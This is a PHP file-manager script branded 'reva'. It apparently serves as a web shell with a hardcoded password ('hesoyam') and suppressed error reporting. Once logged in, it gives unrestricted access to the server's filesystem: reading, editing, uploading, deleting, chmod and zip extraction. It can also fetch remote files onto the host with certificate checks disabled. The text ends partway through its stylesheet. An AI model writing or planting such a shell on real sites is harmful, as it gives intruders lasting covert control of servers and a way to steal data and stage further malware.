<?php
@error_reporting(0);
@session_start();

define('APP_TITLE', 'reva');
define('APP_PASSWORD', 'hesoyam');

// --- Helpers ---
function gs($n) { return isset($_SESSION[$n]) ? $_SESSION[$n] : false; }
function ss($n, $v) { $_SESSION[$n] = $v; }
function gp($n) { return isset($_POST[$n]) ? $_POST[$n] : false; }
function gg($n) { return isset($_GET[$n]) ? $_GET[$n] : false; }
function gf($n) { return isset($_FILES[$n]) ? $_FILES[$n] : false; }
function self_url() { return isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : ''; }

function redirect($url) {
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    $sep = (strpos($url, '?') !== false) ? '&' : '?';
    header('Location: ' . $url . $sep . '_=' . time());
    exit;
}

function norm_path($path) {
    return str_replace('\\', '/', (string) $path);
}

function root_path() {
    $r = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : __DIR__;
    $r = norm_path($r);
    $rr = realpath($r);
    return $rr !== false ? norm_path($rr) : $r;
}

function get_path() {
    $path = root_path();
    $req = gg('p');
    if (!$req) {
        $req = gg('path');
    }
    if (!$req) {
        return $path;
    }
    $req = norm_path($req);
    if (preg_match('#^/([a-zA-Z]:)(/|$)#', $req, $m)) {
        $req = $m[1] . substr($req, 2);
    }
    $real = realpath($req);
    if ($real !== false && is_dir($real)) {
        return norm_path($real);
    }
    return $path;
}

function join_path($base, $name) {
    $s = DIRECTORY_SEPARATOR;
    return rtrim(str_replace('/', $s, $base), $s) . $s . $name;
}

function format_bytes($bytes) {
    $u = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($bytes >= 1024 && $i < count($u) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $u[$i];
}

function sanitize_relative_path($relative_path) {
    $relative_path = norm_path($relative_path);
    $relative_path = trim($relative_path, '/');
    if ($relative_path === '') {
        return false;
    }
    $parts = explode('/', $relative_path);
    $safe = array();
    foreach ($parts as $part) {
        if ($part === '' || $part === '.') {
            continue;
        }
        if ($part === '..') {
            return false;
        }
        $safe[] = $part;
    }
    return empty($safe) ? false : implode('/', $safe);
}

function ensure_parent_dir($filepath) {
    $dir = dirname($filepath);
    if (is_dir($dir)) {
        return true;
    }
    return @mkdir($dir, 0755, true);
}

function delete_item($path) {
    if (!file_exists($path)) {
        return false;
    }
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items === false) {
            return false;
        }
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            if (!delete_item(join_path($path, $item))) {
                return false;
            }
        }
        return @rmdir($path);
    }
    return false;
}

function rename_item($old_path, $new_name) {
    $new_name = trim((string) $new_name);
    if ($new_name === '') {
        return false;
    }
    $new_name = basename($new_name);
    $dir = dirname(norm_path($old_path));
    $new_path = $dir . '/' . $new_name;
    $old_path = norm_path($old_path);
    if (!file_exists($old_path)) {
        return false;
    }
    if (basename($old_path) === $new_name) {
        return true;
    }
    if (file_exists($new_path)) {
        return false;
    }
    if (!is_writable($dir)) {
        return false;
    }
    return @rename($old_path, $new_path);
}

function copy_item($src, $dest_parent) {
    $src = norm_path($src);
    $dest_parent = norm_path($dest_parent);
    if (!file_exists($src) || !is_dir($dest_parent)) {
        return false;
    }
    $name = basename($src);
    $dest = join_path($dest_parent, $name);
    if (file_exists($dest)) {
        return false;
    }
    if (is_file($src) || is_link($src)) {
        return @copy($src, $dest);
    }
    if (is_dir($src)) {
        if (!@mkdir($dest, 0755)) {
            return false;
        }
        $items = @scandir($src);
        if ($items === false) {
            return false;
        }
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            if (!copy_item(join_path($src, $item), $dest)) {
                return false;
            }
        }
        return true;
    }
    return false;
}

function move_item($src, $dest_parent) {
    $src = norm_path($src);
    $dest_parent = norm_path($dest_parent);
    if (!file_exists($src) || !is_dir($dest_parent)) {
        return false;
    }
    $dest = join_path($dest_parent, basename($src));
    if (file_exists($dest)) {
        return false;
    }
    if (@rename($src, $dest)) {
        return true;
    }
    if (copy_item($src, $dest_parent)) {
        return delete_item($src);
    }
    return false;
}

function clipboard_get() {
    $cb = gs('clipboard');
    return (is_array($cb) && !empty($cb['paths'])) ? $cb : false;
}

function clipboard_set($mode, $paths) {
    $safe = array();
    foreach ((array) $paths as $p) {
        $p = norm_path($p);
        if ($p !== '' && file_exists($p)) {
            $safe[] = $p;
        }
    }
    if (empty($safe)) {
        return false;
    }
    ss('clipboard', array('mode' => ($mode === 'cut' ? 'cut' : 'copy'), 'paths' => array_values(array_unique($safe))));
    return true;
}

function clipboard_clear() {
    ss('clipboard', false);
}

function find_files($dir, $query, $max = 200, &$results = array(), $depth = 0) {
    if (count($results) >= $max || $depth > 12) {
        return $results;
    }
    if (!is_dir($dir) || !is_readable($dir)) {
        return $results;
    }
    $items = @scandir($dir);
    if ($items === false) {
        return $results;
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $full = join_path($dir, $item);
        if (!is_accessible_entry($full, $item)) {
            continue;
        }
        if (stripos($item, $query) !== false) {
            $is_dir = @is_dir($full);
            $is_file = @is_file($full);
            $mtime = @filemtime($full);
            $results[] = array(
                'name' => $item,
                'path' => norm_path($full),
                'is_dir' => $is_dir,
                'is_file' => $is_file,
                'size' => $is_file ? format_bytes((int) @filesize($full)) : '-',
                'modified' => $mtime ? date('Y-m-d H:i', $mtime) : '-',
            );
            if (count($results) >= $max) {
                return $results;
            }
        }
        if (@is_dir($full)) {
            find_files($full, $query, $max, $results, $depth + 1);
        }
    }
    return $results;
}

function zip_supported() {
    return class_exists('ZipArchive');
}

function zip_add_dir($zip, $dir, $base) {
    $dir = norm_path($dir);
    $items = @scandir($dir);
    if ($items === false) {
        return;
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $full = $dir . '/' . $item;
        $local = $base . '/' . $item;
        if (is_dir($full)) {
            $zip->addEmptyDir($local);
            zip_add_dir($zip, $full, $local);
        } elseif (is_file($full)) {
            $zip->addFile($full, $local);
        }
    }
}

function zip_create($paths, $zip_path) {
    if (!zip_supported()) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        return false;
    }
    foreach ((array) $paths as $p) {
        $p = norm_path($p);
        if (!file_exists($p)) {
            continue;
        }
        if (is_file($p)) {
            $zip->addFile($p, basename($p));
        } elseif (is_dir($p)) {
            $base = basename($p);
            $zip->addEmptyDir($base);
            zip_add_dir($zip, $p, $base);
        }
    }
    return $zip->close();
}

function zip_extract($zip_path, $dest_dir) {
    if (!zip_supported() || !is_file($zip_path)) {
        return false;
    }
    $zip = new ZipArchive();
    if ($zip->open($zip_path) !== true) {
        return false;
    }
    $dest_dir = norm_path($dest_dir);
    if (!is_dir($dest_dir) && !@mkdir($dest_dir, 0755, true)) {
        $zip->close();
        return false;
    }
    $ok = $zip->extractTo($dest_dir);
    $zip->close();
    return $ok;
}

function http_download($url, $timeout = 45) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => 12,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Reva/1.0',
        ));
        $body = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($body === false || $code >= 400) {
            return false;
        }
        return $body;
    }
    $ctx = stream_context_create(array(
        'http' => array('timeout' => $timeout, 'follow_location' => 1),
        'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
    ));
    $body = @file_get_contents($url, false, $ctx);
    return $body === false ? false : $body;
}

function url_upload_file($url, $dest_dir, $filename = '') {
    $url = trim((string) $url);
    if (!preg_match('#^https?://#i', $url)) {
        return array('ok' => false, 'message' => 'Gecersiz URL (http/https gerekli).');
    }
    if ($filename === '') {
        $urlpath = parse_url($url, PHP_URL_PATH);
        $filename = ($urlpath && basename($urlpath) !== '') ? basename($urlpath) : 'download.bin';
    }
    $filename = basename(trim($filename));
    if ($filename === '' || $filename === '.' || $filename === '..') {
        $filename = 'download.bin';
    }
    $dest = join_path($dest_dir, $filename);
    if (file_exists($dest)) {
        return array('ok' => false, 'message' => 'Dosya zaten var: ' . $filename);
    }
    $data = http_download($url);
    if ($data === false) {
        return array('ok' => false, 'message' => 'URL indirilemedi.');
    }
    if (@file_put_contents($dest, $data) === false) {
        return array('ok' => false, 'message' => 'Dosya kaydedilemedi.');
    }
    return array('ok' => true, 'message' => 'Indirildi: ' . $filename);
}

function resolve_selected_paths($base_path, $names) {
    $paths = array();
    foreach ((array) $names as $n) {
        if ($n === '.' || $n === '..' || $n === '') {
            continue;
        }
        $fp = join_path($base_path, basename($n));
        if (file_exists($fp)) {
            $paths[] = norm_path($fp);
        }
    }
    return $paths;
}

function is_accessible_entry($fullpath, $name) {
    if ($name === '..') {
        return true;
    }
    return @is_dir($fullpath) || @is_file($fullpath) || @is_link($fullpath);
}

function get_dir_list($path) {
    if (!is_dir($path) || !is_readable($path)) {
        return array();
    }
    $dir = @scandir($path);
    if ($dir === false) {
        return array();
    }
    $files = array();
    foreach ($dir as $d) {
        if ($d === '.') {
            continue;
        }
        $p = join_path($path, $d);
        if (!is_accessible_entry($p, $d)) {
            continue;
        }
        $is_dir = @is_dir($p);
        $is_file = @is_file($p);
        $owner = @fileowner($p);
        if ($owner === false) {
            $owner = '-';
        } elseif (function_exists('posix_getpwuid')) {
            $info = @posix_getpwuid($owner);
            $owner = isset($info['name']) ? $info['name'] : $owner;
        }
        $mtime = @filemtime($p);
        $perms = @fileperms($p);
        $files[] = array(
            'name' => $d,
            'path' => norm_path($p),
            'is_dir' => $is_dir,
            'is_file' => $is_file,
            'size' => $is_file ? format_bytes((int) @filesize($p)) : '-',
            'modified' => $mtime ? date('Y-m-d H:i', $mtime) : '-',
            'perms' => $perms !== false ? substr(sprintf('%o', $perms), -4) : '----',
            'owner' => $owner,
        );
    }
    usort($files, function ($a, $b) {
        if ($a['name'] === '..') return -1;
        if ($b['name'] === '..') return 1;
        if ($a['is_dir'] !== $b['is_dir']) {
            return $a['is_dir'] ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    return $files;
}

function path_query($path) {
    return '?p=' . urlencode($path);
}

function render_breadcrumb($path, $root) {
    $path = norm_path($path);
    $parts = explode('/', trim($path, '/'));
    $bp = '';
    echo '<div class="breadcrumb">';
    foreach ($parts as $i => $part) {
        if ($part === '') {
            continue;
        }
        if ($bp === '') {
            $bp = preg_match('/^[a-zA-Z]:$/', $part) ? $part : '/' . $part;
        } else {
            $bp .= '/' . $part;
        }
        echo '<a href="?p=' . urlencode($bp) . '">' . htmlspecialchars($part) . '</a>';
        if ($i < count($parts) - 1) {
            echo '<span>/</span>';
        }
    }
    echo '</div>';
    $parent = dirname($path);
    $parent_real = ($parent !== $path) ? @realpath($parent) : false;
    echo '<div class="nav-quick-links">';
    if ($parent_real !== false && norm_path($parent_real) !== $path) {
        echo '<a href="?p=' . urlencode(norm_path($parent_real)) . '" class="nav-quick">[&larr; Back]</a> ';
    }
    echo '<a href="?p=' . urlencode($root) . '" class="nav-quick">[Home]</a>';
    echo '<span class="nav-current" title="' . htmlspecialchars($path) . '">&#128193; ' . htmlspecialchars(basename($path) ?: $path) . '</span>';
    echo '</div>';
}

function count_dir_items($items) {
    $n = 0;
    foreach ($items as $item) {
        if ($item['name'] === '.' || $item['name'] === '..') {
            continue;
        }
        $n++;
    }
    return $n;
}

// --- Logout ---
if (gg('logout')) {
    $_SESSION = array();
    @session_destroy();
    redirect(self_url());
}

// --- Login ---
if (!gs('login')) {
    if (gp('action')) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(403);
        echo json_encode(array('status' => 'error', 'message' => 'Unauthorized'));
        exit;
    }
    $err = '';
    if (gp('login')) {
        if (hash_equals(APP_PASSWORD, (string) gp('pass'))) {
            ss('login', true);
            redirect(self_url());
        }
        $err = 'Invalid password';
    }
    ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title><?php echo APP_TITLE; ?> — Login</title>
    <link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>:root{--bg:#09090b;--surface:#18181b;--border:#2e2e33;--text:#fafafa;--muted:#a1a1aa;--accent:#38bdf8;--accent2:#818cf8;--danger:#f87171;--font:'Inter',system-ui,sans-serif}*{margin:0;padding:0;box-sizing:border-box}body{font-family:var(--font);background:var(--bg);background-image:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(56,189,248,.12),transparent);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}.login-wrap{width:100%;max-width:400px}.login-brand{text-align:center;margin-bottom:32px}.login-brand h1{font-size:2.5rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}.login-brand p{color:var(--muted);font-size:.875rem;margin-top:6px}.login-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:32px;box-shadow:0 24px 48px rgba(0,0,0,.4)}.form-group{margin-bottom:18px}.form-group label{display:block;margin-bottom:8px;font-size:.75rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}.form-control{width:100%;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--font);font-size:.9375rem}.form-control:focus{outline:0;border-color:var(--accent)}.btn{width:100%;padding:13px;border:none;border-radius:8px;background:linear-gradient(135deg,#0ea5e9,#6366f1);color:#fff;font-family:var(--font);font-size:.9375rem;font-weight:600;cursor:pointer}.alert-error{background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.35);color:var(--danger);padding:12px;border-radius:8px;margin-bottom:18px;font-size:.875rem}</style></head><body>
    <div class="login-wrap"><div class="login-brand"><h1><?php echo APP_TITLE; ?></h1><p>Secure File Manager</p></div><div class="login-box"><?php if ($err) { ?><div class="alert-error"><?php echo htmlspecialchars($err); ?></div><?php } ?>
    <form method="POST"><div class="form-group"><label>Password</label><input type="password" name="pass" class="form-control" placeholder="Enter your password" required autofocus></div><button type="submit" name="login" value="1" class="btn">Sign In</button></form></div></div></body></html><?php
    exit;
}

$path = get_path();
$root = root_path();
$sep = DIRECTORY_SEPARATOR;
$msg = '';
$err = '';
$rq = path_query($path);

// --- AJAX: save ---
if (gp('action') === 'save_ajax') {
    header('Content-Type: application/json; charset=utf-8');
    $edit_path = gp('path') ? gp('path') : '';
    $content = isset($_POST['content']) ? $_POST['content'] : '';
    if (!is_file($edit_path) || !is_writable($edit_path)) {
        echo json_encode(array('status' => 'error', 'message' => 'File not found or not writable.'));
        exit;
    }
    if (@file_put_contents($edit_path, $content) !== false) {
        echo json_encode(array('status' => 'success', 'message' => 'Saved (' . date('H:i:s') . ')'));
    } else {
        echo json_encode(array('status' => 'error', 'message' => 'Could not save file.'));
    }
    exit;
}

// --- AJAX: chunk upload (cachee.php logic) ---
if (gp('action') === 'upload_chunk') {
    header('Content-Type: application/json; charset=utf-8');
    $upload_path = $path;
    if (gp('p')) {
        $pp = norm_path(gp('p'));
        $rp = realpath($pp);
        if ($rp !== false && is_dir($rp)) {
            $upload_path = norm_path($rp);
        }
    }
    $file = gf('chunk');
    $chunk_num = gp('chunk_num');
    $total_chunks = gp('total_chunks');
    $filename = gp('filename');
    $relative_path = gp('relative_path');
    if (!$file || $chunk_num === false || $total_chunks === false || !$filename) {
        echo json_encode(array('status' => 'error', 'message' => 'Invalid chunk upload request.'));
        exit;
    }
    if ($relative_path) {
        $safe_relative = sanitize_relative_path($relative_path);
    } else {
        $safe_relative = sanitize_relative_path(basename($filename));
    }
    if ($safe_relative === false) {
        echo json_encode(array('status' => 'error', 'message' => 'Invalid relative path.'));
        exit;
    }
    $final = join_path($upload_path, str_replace('/', $sep, $safe_relative));
    $temp = $final . '.part';
    if (!ensure_parent_dir($final)) {
        echo json_encode(array('status' => 'error', 'message' => 'Could not create target directory.'));
        exit;
    }
    $chunk_content = @file_get_contents($file['tmp_name']);
    if ($chunk_content === false) {
        echo json_encode(array('status' => 'error', 'message' => 'Could not read chunk data.'));
        exit;
    }
    if (@file_put_contents($temp, $chunk_content, FILE_APPEND) === false) {
        echo json_encode(array('status' => 'error', 'message' => 'Could not write chunk.'));
        exit;
    }
    if ((int) $chunk_num === (int) $total_chunks - 1) {
        if (file_exists($final)) {
            @unlink($temp);
            echo json_encode(array('status' => 'error', 'message' => 'File already exists: ' . basename($safe_relative)));
        } elseif (@rename($temp, $final)) {
            echo json_encode(array('status' => 'success', 'message' => 'Uploaded: ' . $safe_relative));
        } else {
            @unlink($temp);
            echo json_encode(array('status' => 'error', 'message' => 'Could not finalize file.'));
        }
    } else {
        echo json_encode(array('status' => 'chunk_received', 'message' => 'Chunk ' . ((int) $chunk_num + 1) . ' of ' . $total_chunks));
    }
    exit;
}

// --- Actions ---
if (isset($_GET['msg'])) {
    $msg = (string) $_GET['msg'];
}

if (gp('newfile') && ($fn = gp('filename'))) {
    $fp = join_path($path, basename(trim($fn)));
    if (file_exists($fp)) {
        $err = 'File already exists.';
    } elseif (@file_put_contents($fp, '') !== false) {
        $msg = 'File created: ' . basename($fn);
    } else {
        $err = 'Could not create file.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('newdir') && ($dn = gp('dirname'))) {
    $fp = join_path($path, basename(trim($dn)));
    if (file_exists($fp)) {
        $err = 'Directory already exists.';
    } elseif (@mkdir($fp, 0755)) {
        $msg = 'Directory created: ' . basename($dn);
    } else {
        $err = 'Could not create directory.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('bd') && isset($_POST['sel']) && is_array($_POST['sel'])) {
    $ok = 0; $fail = 0;
    foreach ($_POST['sel'] as $n) {
        if ($n === '.' || $n === '..' || $n === '') { $fail++; continue; }
        $fp = join_path($path, basename($n));
        if (!file_exists($fp)) { $fail++; continue; }
        if (delete_item($fp)) { $ok++; } else { $fail++; }
    }
    if ($ok > 0) {
        $msg = $ok . ' item(s) deleted' . ($fail ? ', ' . $fail . ' failed' : '');
    } else {
        $err = 'Bulk delete failed';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('clip_copy') && isset($_POST['sel']) && is_array($_POST['sel'])) {
    $paths = resolve_selected_paths($path, $_POST['sel']);
    if (clipboard_set('copy', $paths)) {
        $msg = count($paths) . ' oge kopyalandi (pano).';
    } else {
        $err = 'Kopyalanacak oge secilmedi.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('clip_cut') && isset($_POST['sel']) && is_array($_POST['sel'])) {
    $paths = resolve_selected_paths($path, $_POST['sel']);
    if (clipboard_set('cut', $paths)) {
        $msg = count($paths) . ' oge kesildi (pano).';
    } else {
        $err = 'Kesilecek oge secilmedi.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('clip_one')) {
    $one = norm_path(gp('clip_one'));
    $mode = gp('clip_mode') === 'cut' ? 'cut' : 'copy';
    if ($one !== '' && file_exists($one) && clipboard_set($mode, array($one))) {
        $msg = ($mode === 'cut' ? 'Kesildi' : 'Kopyalandi') . ': ' . basename($one);
    } else {
        $err = 'Islem basarisiz.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('clip_paste')) {
    $cb = clipboard_get();
    if (!$cb) {
        $err = 'Pano bos.';
    } else {
        $ok = 0; $fail = 0;
        foreach ($cb['paths'] as $src) {
            if (!file_exists($src)) {
                $fail++;
                continue;
            }
            $done = ($cb['mode'] === 'cut') ? move_item($src, $path) : copy_item($src, $path);
            if ($done) {
                $ok++;
            } else {
                $fail++;
            }
        }
        if ($cb['mode'] === 'cut') {
            clipboard_clear();
        }
        if ($ok > 0) {
            $msg = $ok . ' oge yapistirildi' . ($fail ? ', ' . $fail . ' basarisiz' : '');
        } else {
            $err = 'Yapistirma basarisiz.';
        }
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('zip_sel') && isset($_POST['sel']) && is_array($_POST['sel'])) {
    $paths = resolve_selected_paths($path, $_POST['sel']);
    if (empty($paths)) {
        $err = 'ZIP icin oge secilmedi.';
    } elseif (!zip_supported()) {
        $err = 'ZipArchive desteklenmiyor.';
    } else {
        $zip_name = trim((string) gp('zip_name'));
        if ($zip_name === '') {
            $zip_name = 'archive_' . date('Ymd_His') . '.zip';
        }
        if (strtolower(substr($zip_name, -4)) !== '.zip') {
            $zip_name .= '.zip';
        }
        $zip_name = basename($zip_name);
        $zip_path = join_path($path, $zip_name);
        if (file_exists($zip_path)) {
            $err = 'ZIP zaten var: ' . $zip_name;
        } elseif (zip_create($paths, $zip_path)) {
            $msg = 'ZIP olusturuldu: ' . $zip_name;
        } else {
            $err = 'ZIP olusturulamadi.';
        }
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('extract_zip') && gp('zip_file')) {
    $zip_file = norm_path(gp('zip_file'));
    if (!is_file($zip_file) || strtolower(substr($zip_file, -4)) !== '.zip') {
        $err = 'Gecersiz ZIP dosyasi.';
    } elseif (!zip_supported()) {
        $err = 'ZipArchive desteklenmiyor.';
    } elseif (zip_extract($zip_file, $path)) {
        $msg = 'ZIP acildi: ' . basename($zip_file);
    } else {
        $err = 'ZIP acilamadi.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('url_upload') && gp('file_url')) {
    $result = url_upload_file(gp('file_url'), $path, gp('url_filename') ? gp('url_filename') : '');
    if (!empty($result['ok'])) {
        $msg = $result['message'];
    } else {
        $err = $result['message'];
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('rn') && gp('rename') && gp('newname')) {
    if (rename_item(gp('rename'), gp('newname'))) {
        $msg = 'Renamed successfully';
    } else {
        $err = 'Could not rename.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('chmod') && gp('mode')) {
    $mode = gp('mode');
    if (preg_match('/^[0-7]{3,4}$/', $mode) && @chmod(gp('chmod'), octdec($mode))) {
        $msg = 'Permissions changed to ' . $mode;
    } else {
        $err = 'Could not change permissions.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if ($del = gg('delete')) {
    $del = norm_path($del);
    $is_dir = is_dir($del);
    if (delete_item($del)) {
        $msg = ($is_dir ? 'Folder deleted: ' : 'Deleted: ') . basename($del);
    } else {
        $err = 'Could not delete.';
    }
    redirect($rq . '&msg=' . urlencode($msg ?: $err));
}

if (gp('s') && gp('fn') && isset($_POST['ct'])) {
    $fp = join_path($path, basename(gp('fn')));
    @file_put_contents($fp, $_POST['ct']);
    redirect($rq . '&msg=' . urlencode('File saved'));
}

if ($dl = gg('download')) {
    $dl = norm_path($dl);
    if (is_file($dl) && is_readable($dl)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dl) . '"');
        header('Content-Length: ' . filesize($dl));
        readfile($dl);
        exit;
    }
    redirect($rq . '&msg=' . urlencode('File not found'));
}

$edit_name = gg('e');
$edit_content = '';
if ($edit_name) {
    $edit_file = join_path($path, basename($edit_name));
    if (is_file($edit_file) && is_readable($edit_file)) {
        $edit_content = @file_get_contents($edit_file);
    } else {
        $edit_name = '';
        $err = 'File not found.';
    }
}

$items = get_dir_list($path);
$clipboard = clipboard_get();
$find_query = gg('q') ? trim((string) gg('q')) : '';
$find_active = (gg('find') !== false && $find_query !== '');
$find_results = array();
if ($find_active) {
    $find_results = find_files($path, $find_query);
}
$disk_free = @disk_free_space($root);
$disk_total = @disk_total_space($root);
$disk_pct = ($disk_total > 0) ? round(($disk_total - $disk_free) / $disk_total * 100, 1) : 0;

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<title><?php echo APP_TITLE; ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{
--bg:#09090b;--surface:#131316;--surface2:#1a1a1f;--surface3:#222228;
--border:#2a2a30;--border2:#36363f;
--text:#f4f4f5;--text2:#d4d4d8;--muted:#71717a;--muted2:#a1a1aa;
--accent:#38bdf8;--accent2:#818cf8;--accent-glow:rgba(56,189,248,.15);
--success:#34d399;--success-bg:rgba(52,211,153,.1);
--danger:#f87171;--danger-bg:rgba(248,113,113,.1);
--warn:#fbbf24;--purple:#a78bfa;
--radius:10px;--radius-lg:14px;
--font:'Inter',system-ui,-apple-system,'Segoe UI',sans-serif;
--mono:'JetBrains Mono','Cascadia Code',Consolas,monospace;
--shadow:0 4px 24px rgba(0,0,0,.35);
--transition:.18s ease;
}
*{margin:0;padding:0;box-sizing:border-box}
html{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
body{font-family:var(--font);background:var(--bg);color:var(--text2);font-size:14px;line-height:1.5;
background-image:radial-gradient(ellipse 70% 50% at 0% 0%,rgba(56,189,248,.06),transparent),radial-gradient(ellipse 50% 40% at 100% 0%,rgba(129,140,248,.05),transparent)}
.wrapper{display:flex;min-height:100vh}

/* Sidebar */
.sidebar{width:248px;background:var(--surface);border-right:1px solid var(--border);padding:20px 16px;flex-shrink:0;display:flex;flex-direction:column}
.logo{text-align:center;padding:20px 12px 24px;border-bottom:1px solid var(--border);margin-bottom:8px}
.logo h2{font-size:1.5rem;font-weight:700;letter-spacing:-.02em;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.logo span{display:block;font-size:.6875rem;color:var(--muted);text-transform:uppercase;letter-spacing:.12em;margin-top:4px;font-weight:500}
nav{flex:1;padding:8px 0}
.nav-item{padding:10px 14px;margin:2px 0;border-radius:8px;color:var(--muted2);text-decoration:none;display:flex;align-items:center;gap:10px;font-size:.875rem;font-weight:500;transition:all var(--transition)}
.nav-item:hover{background:var(--surface2);color:var(--text)}
.nav-item.active{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.08));color:var(--accent);border:1px solid rgba(56,189,248,.2)}
.stats{margin-top:auto;padding:16px;background:var(--bg);border-radius:var(--radius);border:1px solid var(--border)}
.stats h4{font-size:.625rem;color:var(--muted);margin-bottom:12px;text-transform:uppercase;letter-spacing:.1em;font-weight:600}
.stat-item{display:flex;justify-content:space-between;margin:6px 0;font-size:.8125rem}
.stat-item span:last-child{color:var(--text);font-weight:500;font-family:var(--mono);font-size:.75rem}
.progress{height:5px;background:var(--surface3);border-radius:99px;margin-top:10px;overflow:hidden}
.progress-bar{height:100%;background:linear-gradient(90deg,#0ea5e9,#34d399);border-radius:99px;transition:width .4s ease}

/* Main */
.main{flex:1;padding:24px 28px;overflow-x:auto;max-width:100%}
.header{background:var(--surface);padding:18px 22px;border-radius:var(--radius-lg);border:1px solid var(--border);margin-bottom:20px;display:flex;justify-content:space-between;align-items:flex-start;gap:16px;flex-wrap:wrap;box-shadow:var(--shadow)}
.breadcrumb{display:flex;align-items:center;flex-wrap:wrap;gap:6px}
.breadcrumb a{color:var(--accent);text-decoration:none;padding:4px 10px;background:var(--bg);border:1px solid var(--border);border-radius:6px;font-size:.8125rem;font-weight:500;transition:all var(--transition)}
.breadcrumb a:hover{background:var(--surface2);border-color:var(--border2)}
.breadcrumb span{color:var(--muted);font-size:.75rem}
.nav-quick-links{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
.nav-quick{color:var(--muted2);text-decoration:none;font-size:.8125rem;padding:5px 12px;background:var(--bg);border:1px solid var(--border);border-radius:6px;font-weight:500;transition:all var(--transition)}
.nav-quick:hover{color:var(--accent);border-color:rgba(56,189,248,.3);background:rgba(56,189,248,.06)}
.nav-current{color:var(--accent);font-size:.8125rem;padding:5px 12px;background:rgba(56,189,248,.08);border:1px solid rgba(56,189,248,.25);border-radius:6px;font-weight:600}
.dir-parent td{background:rgba(56,189,248,.04)}
.dir-parent:hover td{background:rgba(56,189,248,.08)}
.actions{display:flex;gap:8px;flex-wrap:wrap}

/* Buttons */
.btn{padding:9px 16px;border:none;border-radius:8px;cursor:pointer;font-family:var(--font);font-size:.8125rem;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;gap:6px;transition:all var(--transition);white-space:nowrap}
.btn:hover{transform:translateY(-1px);filter:brightness(1.08)}
.btn:active{transform:translateY(0)}
.btn-primary{background:linear-gradient(135deg,#2563eb,#3b82f6);color:#fff;box-shadow:0 2px 10px rgba(37,99,235,.3)}
.btn-success{background:linear-gradient(135deg,#059669,#34d399);color:#fff;box-shadow:0 2px 10px rgba(5,150,105,.25)}
.btn-danger{background:linear-gradient(135deg,#dc2626,#f87171);color:#fff;box-shadow:0 2px 10px rgba(220,38,38,.25)}
.btn-ghost{background:var(--surface2);color:var(--text2);border:1px solid var(--border)}
.btn-ghost:hover{border-color:var(--border2)}
